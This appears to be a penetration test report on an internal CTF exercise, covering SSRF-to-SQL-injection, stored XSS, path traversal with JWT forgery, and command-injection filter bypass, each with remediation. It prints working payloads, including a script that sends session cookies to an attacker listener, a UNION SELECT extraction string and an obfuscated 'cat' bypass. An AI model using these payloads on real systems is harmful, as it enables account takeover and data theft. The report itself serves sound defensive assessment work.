
# Penetration Test Report We Innovate (Web)
**Client:** Zerosploit
**Date:** 2025-12-14
**Assessment Type:** Web Application Penetration Test

---

## 1. Executive Summary

**Internal CTF Assessment** contracted to perform a targeted web application penetration test against four distinct challenge environments. The goal was to identify critical security vulnerabilities, demonstrate proof-of-concept exploitation, and recommend remediation strategies.

### 1.1 Assessment Overview
During the assessment, **5** findings were identified, ranging from Critical to Medium severity. The assessment highlighted significant deficiencies in input validation across multiple applications, leading to full system compromise in several instances.

* **Server-Side Vulnerabilities:** Critical flaws such as SSRF and SQL Injection allowed for unauthorized access to internal network resources and database exfiltration.
* **Client-Side Attacks:** Stored XSS vulnerabilities facilitated administrator session hijacking.
* **Broken Access Control:** Path traversal combined with weak secrets management allowed for JWT forgery and privilege escalation.
* **Remote Code Execution:** Weak input filtering allowed for OS Command Injection via WAF bypass techniques.

> [!summary] Key Recommendation
> The organization must prioritize implementing strict input validation (allow-listing) rather than relying on blacklists. Additionally, sensitive secrets must be managed via secure vaults, not stored in configuration files or code.

---

## 2. Attack Walkthrough

> [!info] Attack Narratives
> This section outlines the attack chains executed to compromise the target applications.

### Scenario 1: Internal Network Access & Database Exfiltration
The assessor identified a URL fetch feature vulnerable to **Server-Side Request Forgery (SSRF)**. By bypassing a blacklist using `0.0.0.0`, access was gained to an internal service running on port 8001. This internal service contained a search parameter vulnerable to **SQL Injection**, which was exploited to extract the flag.

### Scenario 2: Administrator Session Hijacking
Upon registering a standard user account, the assessor discovered a comment section vulnerable to **Stored Cross-Site Scripting (XSS)**. A JavaScript payload was injected to fetch the administrator's session cookies and send them to an attacker-controlled listener (`python http.server`). This cookie was used to hijack the administrator's session.

### Scenario 3: Privilege Escalation via JWT Forgery
The application utilized JSON Web Tokens (JWT) for authentication. A **Path Traversal** vulnerability in the `content` parameter allowed the assessor to read arbitrary files. After retrieving the application's secret key from `docker-compose.yml`, the assessor forged a new JWT with `is_admin: true`, granting administrative access.

### Scenario 4: RCE via Filter Bypass
An administrative interface allowed for system diagnostics (ping) but filtered specific keywords. The assessor bypassed this blacklist by injecting escape characters (e.g., `ca\t`), successfully executing arbitrary commands to read sensitive files.

---

## 3. Findings Summary

### 3.1 Severity Breakdown

| Severity | Count |
| :--- | :---: |
| ðŸ”´ **Critical** | 2 |
| ðŸŸ  **High** | 2 |
| ðŸŸ¡ **Medium** | 1 |
| âšª **Info** | 0 |
| **Total** | **5** |

### 3.2 Finding List

| ID | Severity | Finding Name |
| :--- | :--- | :--- |
| [[#4.1 Server-Side Request Forgery (SSRF) & SQL Injection\|1]] | ðŸ”´ Critical | SSRF leading to SQL Injection |
| [[#4.2 OS Command Injection via Filter Bypass\|2]] | ðŸ”´ Critical | OS Command Injection via Filter Bypass |
| [[#4.3 Stored Cross-Site Scripting (XSS)\|3]] | ðŸŸ  High | Stored XSS leading to Session Hijacking |
| [[#4.4 Path Traversal & JWT Secret Disclosure\|4]] | ðŸŸ  High | Path Traversal & JWT Forgery |
| [[#4.5 Weak Password Hashing\|5]] | ðŸŸ¡ Medium | Weak Password Hashing (SHA-256) |

---

## 4. Technical Findings Details

### 4.1 Server-Side Request Forgery (SSRF) & SQL Injection

> [!fail] Severity: Critical
> **CVSS Score:** 9.8
> **CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html) / [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

#### Description
The application accepts a user-supplied URL to fetch content. The implementation relies on an insufficient blacklist (`localhost`, `127.0.0.1`) to prevent access to internal resources. Furthermore, the internal service reachable via this SSRF contains a SQL Injection vulnerability in the `id` parameter.

#### Security Impact
* **SSRF:** Allows an attacker to port scan the internal network and access services bound to the loopback interface.
* **SQLi:** Allows complete disclosure of the internal database, including sensitive flags and credentials.

#### Evidence
**1. Source Code Analysis:**
The code reveals the blacklist usage, which is easily bypassed.
![[Pasted image 20251214184512.png]]

**2. SSRF Bypass:**
The assessor bypassed the blacklist using `0.0.0.0` to reach the internal service:
`http://0.0.0.0:8001/`
![[Pasted image 20251214184701.png]]

**3. SQL Injection Exploitation:**
The internal search ID parameter was found to be unsanitized.
![[Pasted image 20251214184750.png]]

The following payload successfully extracted the flag from the `sqli_secret` table:
```http
[http://0.0.0.0:8001/search?id=1](http://0.0.0.0:8001/search?id=1) UNION SELECT id,flag,description FROM sqli_secret WHERE id=98651251--
```
![[Pasted image 20251214185245.png]]

#### Remediation
* [ ] **SSRF:** Implement a strict allow-list of permitted domains/IPs. Ensure the HTTP client does not follow redirects to internal IP ranges.
* [ ] **SQLi:** Use Parameterized Queries (Prepared Statements) for all database interactions.

---

### 4.2 Stored Cross-Site Scripting (XSS)

> [!fail] Severity: High
> **CVSS Score:** 8.8
> **CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)

#### Description
The comment functionality fails to properly sanitize user input before rendering it in the browser. This allows an attacker to inject malicious JavaScript execution.

#### Security Impact
An attacker can execute arbitrary JavaScript in the context of other users. In this assessment, the vulnerability was used to steal the Administrator's session cookie, leading to a full account takeover.

#### Evidence
**1. Access Limitations:**
The attacker initially has no access to the Admin panel.
![[Pasted image 20251214211218.png]]

**2. Payload Injection:**
The assessor injected a script to exfiltrate cookies to an external listener:
```html
<script>
fetch('[http://172.22.110.208:1234//?cookie=](http://172.22.110.208:1234//?cookie=)' + document.cookie);
</script>
```
![[Pasted image 20251214211411.png]]

**3. Session Hijacking:**
The administrative bot executed the XSS, sending the session cookie to the attacker's Python server.
![[Pasted image 20251214213923.png]]
![[Pasted image 20251214214135.png]]

Using this cookie, the assessor successfully accessed the admin dashboard.
![[Pasted image 20251214214100.png]]

#### Remediation
* [ ] Implement Context-Aware Output Encoding (e.g., HTML entity encoding) for all user-supplied data.
* [ ] Implement a Content Security Policy (CSP) to restrict the sources of executable scripts.
* [ ] Set the `HttpOnly` flag on session cookies to prevent access via JavaScript.

---

### 4.3 Path Traversal & JWT Secret Disclosure

> [!fail] Severity: High
> **CVSS Score:** 8.6
> **CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html) / [CWE-327](https://cwe.mitre.org/data/definitions/327.html)

#### Description
The `content` endpoint is vulnerable to Directory Traversal via the `section` parameter. This allowed the reading of configuration files containing sensitive secrets (`docker-compose.yml`). This secret was then used to sign a forged JSON Web Token (JWT), escalating privileges to Administrator.

#### Security Impact
* **Information Disclosure:** Access to application source code and configuration files.
* **Privilege Escalation:** Full administrative access to the application.

#### Evidence
**1. Path Traversal:**
The application code blindly concatenates the file path.
![[Pasted image 20251214193701.png]]

**2. Secret Extraction:**
The assessor navigated the directory structure to locate `docker-compose.yml`, which contained the JWT secret.
Payload: `../../docker-compose.yml`
![[Pasted image 20251214202304.png]]

**3. JWT Forgery:**
Using the extracted secret, the `is_admin` claim was modified to `true`.
![[Pasted image 20251214202444.png]]
Access to the admin flag was achieved:
![[Pasted image 20251214202210.png]]

#### Remediation
* [ ] Validate that the user input resolves to the expected directory using `os.path.abspath` and checking against the allowed base directory.
* [ ] Move secrets out of code/config files and into a secure secrets manager or environment variables injected at runtime.

### 4.4 Weak Password Hashing (SHA-256)

> [!warning] Severity: Medium
> **CVSS Score:** 5.5
> **CWE:** [CWE-328](https://cwe.mitre.org/data/definitions/328.html)

#### Description
During the analysis of the `sqlite3` database associated with Challenge 3, it was observed that user passwords (specifically user `remo`) are hashed using standard SHA-256 without salt or a work factor (like bcrypt/Argon2).

#### Security Impact
SHA-256 is a fast hashing algorithm designed for speed, not password storage. This makes the hashes susceptible to brute-force and rainbow table attacks if the database is compromised.

#### Evidence
Database dump showing the hash format:
![[Pasted image 20251214211044.png]]

#### Remediation
* [ ] Migrate to a slow hashing algorithm specifically designed for passwords, such as **Argon2id** or **bcrypt**.


---

### 4.5 OS Command Injection via Filter Bypass

> [!fail] Severity: Critical
> **CVSS Score:** 9.8
> **CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html)

#### Description
The application allows users to execute system commands (presumably for diagnostics) but relies on a blacklist to block specific keywords like `cat` and `flag`. This filter is insufficient and was bypassed using simple obfuscation techniques.

#### Security Impact
This vulnerability allows for Remote Code Execution (RCE). An attacker can execute any command on the underlying server with the privileges of the web application user.

#### Evidence
**1. WAF/Filter Detection:**
Standard commands were blocked by the application.
![[Pasted image 20251214204110.png]]

**2. Bypassing the Filter:**
The assessor used escape characters and string splitting (e.g., `ca\t`) to evade the keyword detection while still executing the valid command in the shell.
Payload: `ca\t ../../../fla\g.tx\t`

**3. Execution:**
The payload successfully retrieved the flag.
![[Pasted image 20251214204543.png]]

#### Remediation
* [ ] Avoid making direct system calls with user input. Use language-specific APIs instead (e.g., Python's `File` objects).
* [ ] If system calls are unavoidable, avoid shell execution (`shell=False`) and strictly validate input against a whitelist of allowed arguments.
---

## 5. Remediation Summary

### Short Term (Immediate)
* [ ] **Finding 1 (SSRF/SQLi):** Remove the blacklist logic and sanitize the `id` parameter using parameterized queries.
* [ ] **Finding 2 (RCE):** Disable the shell execution feature or enforce a strict allow-list for inputs.
* [ ] **Finding 3 (XSS):** Enable `HttpOnly` on session cookies immediately.

### Long Term
* [ ] **Secrets Management:** Implement a proper secrets management solution (e.g., HashiCorp Vault) to prevent hardcoded secrets in `docker-compose` or source files.
* [ ] **Secure Coding Training:** Educate developers on the dangers of "rolling their own" security filters (blacklists) versus using established security libraries.